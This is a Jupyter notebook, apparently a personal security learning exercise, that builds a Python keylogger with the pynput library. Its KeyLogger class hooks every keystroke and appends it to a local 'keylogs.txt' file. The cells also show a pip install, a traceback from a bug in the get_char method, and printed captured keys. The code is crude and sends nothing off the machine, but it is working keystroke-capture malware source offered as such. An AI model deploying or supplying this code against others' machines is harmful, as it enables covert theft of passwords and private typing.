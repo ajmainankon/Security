{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'pynput'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-1-91748dc5d6d3>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[1;32mfrom\u001b[0m \u001b[0mpynput\u001b[0m \u001b[1;32mimport\u001b[0m \u001b[0mkeyboard\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'pynput'"
     ]
    }
   ],
   "source": [
    "from pynput import keyboard\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynput\n",
      "  Using cached pynput-1.7.3-py2.py3-none-any.whl (99 kB)\n",
      "Requirement already satisfied: six in c:\\users\\ajmai\\anaconda3\\lib\\site-packages (from pynput) (1.15.0)\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.3\n"
     ]
    }
   ],
   "source": [
    "# !pip install pynput "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Unhandled exception in listener callback\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Users\\ajmai\\anaconda3\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 211, in inner\n",
      "    return f(self, *args, **kwargs)\n",
      "  File \"C:\\Users\\ajmai\\anaconda3\\lib\\site-packages\\pynput\\keyboard\\_win32.py\", line 284, in _process\n",
      "    self.on_press(key)\n",
      "  File \"C:\\Users\\ajmai\\anaconda3\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 127, in inner\n",
      "    if f(*args) is False:\n",
      "  File \"<ipython-input-2-04b3fc32ce6a>\", line 14, in on_press\n",
      "    logs.write(self.get_char(key))\n",
      "TypeError: get_char() takes 1 positional argument but 2 were given\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'d'\n"
     ]
    }
   ],
   "source": [
    "class KeyLogger():\n",
    "    def __init__(self, filename: str = \"keylogs.txt\") -> None:\n",
    "        self.filename = filename\n",
    "\n",
    "    def get_char(key):\n",
    "        try:\n",
    "            return key.char\n",
    "        except AttributeError:\n",
    "            return str(key)\n",
    "\n",
    "    def on_press(self, key):\n",
    "        print(key)\n",
    "        with open(self.filename, 'a') as logs:\n",
    "            logs.write(self.get_char(key))\n",
    "\n",
    "    def main(self):\n",
    "        listener = keyboard.Listener(\n",
    "            on_press=self.on_press,\n",
    "        )\n",
    "        listener.start()\n",
    "\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    logger = KeyLogger()\n",
    "    logger.main()\n",
    "    input()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Key.shift_r\n",
      "Key.enter\n",
      "'d'\n",
      "'s'\n",
      "'d'\n",
      "Key.shift_r\n",
      "Key.ctrl_l\n",
      "<191>\n",
      "'\\x13'\n",
      "Key.shift_r\n"
     ]
    }
   ],
   "source": [
    "# from pynput import keyboard\n",
    "# def on_press(key):\n",
    "#     print(key)\n",
    "\n",
    "# listener = keyboard.Listener(on_press=on_press)\n",
    "# listener.start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
